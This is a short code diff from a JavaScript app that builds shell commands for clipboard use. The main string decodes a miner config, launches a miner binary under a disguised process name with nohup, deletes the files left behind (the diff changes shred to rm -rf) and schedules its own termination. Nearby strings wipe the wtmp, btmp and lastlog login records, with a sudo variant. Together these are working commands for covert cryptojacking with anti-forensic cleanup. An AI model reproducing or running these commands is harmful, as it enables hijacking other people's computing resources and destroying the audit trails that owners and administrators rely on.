@@ -26,7 +26,7 @@ const App = () => {
 
   const clipboard = navigator.clipboard
 
-  const ethScript = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && shred -uz nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
+  const ethScript = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
 
   const clearLoginHistoryScript = ` echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog`
   const clearLoginHistoryScriptWithSudo = ` sudo sh -c '${clearLoginHistoryScript}'`
